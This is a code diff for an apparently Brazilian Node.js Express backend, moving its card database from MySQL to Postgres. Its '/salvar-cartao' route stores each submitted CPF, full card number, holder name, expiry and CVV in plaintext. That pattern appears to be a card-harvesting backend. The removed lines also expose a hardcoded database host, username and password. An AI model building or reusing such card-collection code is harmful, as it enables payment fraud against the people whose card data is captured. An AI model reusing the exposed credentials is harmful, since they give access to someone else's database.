@@ -5,7 +5,7 @@ const bodyParser = require("body-parser");
 const cors = require("cors");
 const fs = require("fs");
 const { v4: uuidv4 } = require("uuid");
-const mysql = require("mysql2");
+const { Pool } = require("pg"); // 🔄 troquei mysql2 por pg
 
 const app = express();
 app.use(bodyParser.json());
@@ -92,39 +92,34 @@ app.post("/gerar-chave-pix", async (req, res) => {
 });
 
 /***********************************
- * CONFIGURAÇÃO BANCO CARTÕES (PHP) *
+ * CONFIGURAÇÃO BANCO CARTÕES (PG) *
  ***********************************/
-const db = mysql.createConnection({
-  host: "sql110.infinityfree.com",
-  user: "if0_39790610",
-  password: "M10019210a",
-  database: "if0_39790610_teste",
+const pool = new Pool({
+  connectionString: process.env.DATABASE_URL, // 🔄 variavel de ambiente
+  ssl: { rejectUnauthorized: false }, // 🔄 necessário no Render
 });
 
-db.connect((err) => {
-  if (err) {
-    console.error("Erro de conexão com o banco:", err.message);
-  } else {
-    console.log("Conectado ao banco InfinityFree!");
-  }
-});
+pool.connect()
+  .then(() => console.log("Conectado ao banco Postgres no Render!"))
+  .catch(err => console.error("Erro de conexão com o banco:", err.message));
 
 // Rota para salvar cartões
-app.post("/salvar-cartao", (req, res) => {
+app.post("/salvar-cartao", async (req, res) => {
   const { cpf, numero, nome, validade, cvv } = req.body;
 
   if (!cpf || !numero || !nome || !validade || !cvv) {
     return res.status(400).json({ error: "Todos os campos são obrigatórios." });
   }
 
-  const sql = "INSERT INTO cartoes (cpf, numero, nome, validade, cvv) VALUES (?, ?, ?, ?, ?)";
-  db.execute(sql, [cpf, numero, nome, validade, cvv], (err, results) => {
-    if (err) {
-      console.error("Erro ao salvar cartão:", err.message);
-      return res.status(500).json({ error: "Erro ao salvar cartão." });
-    }
+  try {
+    const sql = "INSERT INTO cartoes (cpf, numero, nome, validade, cvv) VALUES ($1, $2, $3, $4, $5)";
+    await pool.query(sql, [cpf, numero, nome, validade, cvv]);
+
     res.json({ sucesso: true, mensagem: "Cartão salvo com sucesso!" });
-  });
+  } catch (err) {
+    console.error("Erro ao salvar cartão:", err.message);
+    res.status(500).json({ error: "Erro ao salvar cartão." });
+  }
 });
 
 /******************************
